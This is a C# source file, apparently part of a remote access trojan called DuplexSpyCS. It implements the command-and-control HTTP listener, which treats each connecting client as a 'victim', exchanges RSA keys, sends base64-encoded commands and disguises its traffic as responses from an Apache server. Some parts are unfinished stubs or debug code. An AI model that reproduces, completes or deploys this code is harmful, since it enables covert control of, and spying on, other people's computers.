using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public class clsHttpListener : clsListener
    {
        private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();
        private TcpListener m_listener { get; set; }
        private CancellationTokenSource m_cts { get; set; }

        public clsHttpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.HTTP;

            m_listener = new TcpListener(IPAddress.Any, nPort);
            m_cts = new CancellationTokenSource();

            m_bIslistening = false;
        }

        public class clsHttpResp
        {
            private string szBody { get; init; }

            public clsHttpResp()
            {
                szBody = string.Empty;
            }

            public clsHttpResp(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(int nCmd, int nParam, byte[] abMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
                szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(string szMsg)
            {
                szBody = szMsg;
            }

            public byte[] fnGetBytes() => fnGetBytes(szBody);
            public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
            public byte[] fnGetBytes(string szMsg)
            {
                string szResp = $"" +
                    $"HTTP/1.1 200 OK\r\n" +
                    $"Server: Apache/1.3.27\r\n" +
                    $"Content-Type: text/html\r\n" +
                    $"content-length: {szBody.Length}\r\n\r\n" +
                    $"{szBody}";

                return Encoding.UTF8.GetBytes(szResp);
            }

            public byte[] fnGetBytes(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                return fnGetBytes(dsp.GetBytes());
            }
        }

        ~clsHttpListener() => fnStop();

        public override void fnStart()
        {
            try
            {
                Socket sktSrv = m_listener.Server;
                var hSafe = sktSrv.SafeHandle;
                if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    m_listener = new TcpListener(IPAddress.Any, m_nPort);

                m_listener.Start();
                _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
                m_bIslistening = true;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public override void fnStop()
        {
            if (!m_bIslistening)
                return;

            try
            {
                m_cts.Cancel();
                m_listener.Stop();
                m_bIslistening = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStop()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void fnEnqueue(byte[] abBuffer)
        {

        }
        public void fnEnqueue(clsHttpResp resp)
        {
            m_qResponse.Enqueue(resp);
        }

        public clsHttpResp fnGetResponse()
        {
            if (m_qResponse.Count == 0)
            {
                return new clsHttpResp(clsCrypto.b64E2Str(clsEZData.fnGenerateRandomStr()));
            }
            else
            {
                return m_qResponse.Dequeue();
            }
        }

        public void fnReqHandler()
        {

        }

        private async Task fnAcceptLoop(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && m_bIslistening)
            {
                try
                {
                    var client = await m_listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => fnHandleClient(client), ct);
                }
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Accept error: {ex.Message}");
                }
            }
        }

        private async Task fnHandleClient(TcpClient client)
        {
            using (client)
            {
                NetworkStream stream = client.GetStream();
                clsVictim victim = new clsVictim(this, client.Client);

                var s = clsCrypto.CreateRSAKey();
                string szRsaPublicKey = s[0];
                string szRsaPrivateKey = s[1];

                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());

                var (header, bodyBytes) = await fnReadHttpPacket(stream);
                if (bodyBytes.Length == 0)
                    return;

                string szBody = Encoding.UTF8.GetString(bodyBytes);
                while (m_bIslistening)
                {
                    try
                    {
                        byte[] abBody = Convert.FromBase64String(szBody);
                        if (abBody.Length == 0)
                            continue;

                        clsDSP dsp = new clsDSP(abBody);
                        var headerInfo = clsDSP.GetHeader(abBody);
                        var msg = dsp.GetMsg();
                        int nCmd = headerInfo.cmd;
                        int nParam = headerInfo.para;
                        byte[] abMsg = dsp.GetMsg().msg;

                        MessageBox.Show(nCmd.ToString());
                    }
                    catch (Exception ex)
                    {

                    }
                }
            }
        }

        private async Task<(string header, byte[] body)> fnReadHttpPacket(NetworkStream stream)
        {
            byte[] buffer = new byte[4096];
            MemoryStream headerStream = new MemoryStream();

            while (true)
            {
                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (read <= 0)
                    throw new Exception("Client disconnected");

                headerStream.Write(buffer, 0, read);

                string temp = Encoding.ASCII.GetString(headerStream.ToArray());
                int idx = temp.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                if (idx >= 0)
                {
                    byte[] all = headerStream.ToArray();
                    byte[] headerBytes = all[..(idx + 4)];
                    byte[] remain = all[(idx + 4)..];

                    string header = Encoding.ASCII.GetString(headerBytes);

                    int contentLength = 0;
                    foreach (string line in header.Split("\r\n"))
                    {
                        if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                        {
                            int.TryParse(line.Substring(15).Trim(), out contentLength);
                        }
                    }

                    byte[] body = new byte[contentLength];
                    int copied = Math.Min(remain.Length, contentLength);
                    Array.Copy(remain, 0, body, 0, copied);

                    int offset = copied;
                    while (offset < contentLength)
                    {
                        int r = await stream.ReadAsync(body, offset, contentLength - offset);
                        if (r <= 0)
                            throw new Exception("Unexpected EOF while reading body");
                        offset += r;
                    }

                    return (header, body);
                }
            }
        }

    }
}
